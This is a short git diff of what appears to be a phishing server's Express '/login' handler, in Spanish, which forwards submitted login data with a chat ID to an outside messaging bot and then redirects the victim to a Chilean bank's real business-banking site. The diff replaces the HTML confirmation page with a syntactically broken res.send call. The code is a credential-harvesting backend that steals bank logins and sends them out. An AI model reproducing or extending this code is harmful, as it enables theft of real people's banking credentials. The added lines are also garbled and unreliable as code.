@@ -26,23 +26,10 @@ app.post("/login", async (req, res) => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
-
-    // Enviar HTML con mensaje y redirección
-    res.setHeader("Content-Type", "text/html; charset=utf-8");
-    res.send(`
-  <!DOCTYPE html>
-  <html lang="es">
-  <head>
-    <meta charset="UTF-8">
-    <title>Solicitud recibida</title>
-    <meta http-equiv="refresh" content="3;url=https://empresas.officebanking.cl">
-  </head>
-  <body>
-    <p>✅ Hemos recibido tu solicitud.</p>
-  </body>
-  </html>
-`);
-
+    
+      res.send("✅ Hemos recibido tu solicitud"
+      <meta http-equiv="refresh" content="3;url=https://empresas.officebanking.cl">
+      
   } catch (error) {
     console.error(error);
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
